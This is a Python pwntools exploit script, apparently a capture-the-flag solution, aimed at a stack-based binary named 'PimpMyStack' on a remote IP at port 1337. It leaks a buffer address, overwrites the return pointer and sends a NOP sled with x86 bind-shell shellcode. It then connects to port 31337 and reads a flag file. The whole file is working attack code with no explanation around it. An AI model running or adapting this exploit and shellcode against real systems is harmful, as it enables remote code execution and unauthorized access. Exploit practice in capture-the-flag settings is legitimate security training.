from pwn import *
from sys import exit
#context(log_level='debug')
IP = "162.243.77.53"
PORT = 1337
# http://shell-storm.org/shellcode/files/shellcode-847.php
sc = (
    "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66"
    "\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89"
    "\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52"
    "\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10"
    "\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04"
    "\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
    "\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3"
    "\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80"
    "\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68"
    "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
    "\xe1\x52\x89\xe2\xb0\x0b\xcd\x80")
addr_str = "0xffffcda0 0xffffcdbc 0xffffcdfc".split(" ")
base = int(addr_str[0], 16)
bufptr_dist = int(addr_str[1], 16) - base
retnptr_dist = int(addr_str[2], 16) - base
bi = ELF('./PimpMyStack')
#p = process(bi.path)
p = remote(IP, PORT)
print(p.recvuntil("input: "))
p.send("-1\n")
bstr = p.recvuntil("dere: ")
addr = bstr.split('@')[1].split(",")[0]
print("Read buffer addr: " + addr)
bufptr = int(addr, 16) + bufptr_dist
retnptr = int(addr, 16) + retnptr_dist
pwnbuf = "A"*(bufptr_dist-1)
overwrite = p32(retnptr-len(pwnbuf)-2)[0]
pwnbuf += overwrite
p.send(pwnbuf)
p.send(p32(retnptr+100)+'\x90'*200+sc)
print("Payload sent... connecting to shell")
p.close()

#exploit complete, lets check the bind shell...
try:
    rshell = remote(IP, 31337)
except:
    print("Exploit failed this time, run again")
    exit(1)
#rshell.interactive()
rshell.sendline("cat /home/pms/flag.txt")
print("Your flag is: " + rshell.recvline())
rshell.close()
